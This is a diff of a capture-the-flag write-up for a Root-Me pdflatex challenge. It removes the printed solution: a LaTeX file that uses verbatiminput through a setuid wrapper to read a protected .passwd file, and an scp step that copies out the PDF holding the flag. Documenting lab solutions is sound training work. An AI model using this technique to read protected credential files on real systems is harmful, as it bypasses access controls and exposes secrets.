@@ -17,8 +17,6 @@ Attention:
     Publier des solutions publiquement (blog, github, youtube, etc.) est interdit.
 ```
 
-The solution is not given here. The flow to get it is. 
-
 ```text
 $ ls -la
 total 676
@@ -51,27 +49,9 @@ $ pwd
 /challenge/app-script/ch23
 ```
 
-After several attempts using the hacks from the resources given, I decided to look in other directions and made a swerve to [GTFOBins pdflatex](https://gtfobins.github.io/gtfobins/pdflatex/), applying it in this `/tmp/article.tex`:
+After several attempts using the hacks from the resources given, I decided to look in other directions and made a swerve to [GTFOBins pdflatex](https://gtfobins.github.io/gtfobins/pdflatex/).
 
-```text
-\documentclass{article}
-\usepackage{verbatim}
-\begin{document}
-\verbatiminput{/challenge/app-script/ch23/.passwd}
-\end{document}
-```
-
-Then created `main.pdf` using the `setuid-wrapper` binary:
-
-```text
-$ ~/setuid-wrapper /tmp/article.tex
-```
-
-And extracted the resulting `.pdf` file to the local machine using `scp`. Mind to change the `/path/to/` to the results:
-
-    $ scp -P 2222 app-script-ch23@challenge02.root-me.org:</path/to/>main.pdf /home/kali/Downloads/
-
-Lo and behold. Finally! It contained the flag (leave out the `%`).
+The LaTeX module `verbatim` permits input of a file without interpreting it.
 
 ## Resources
 
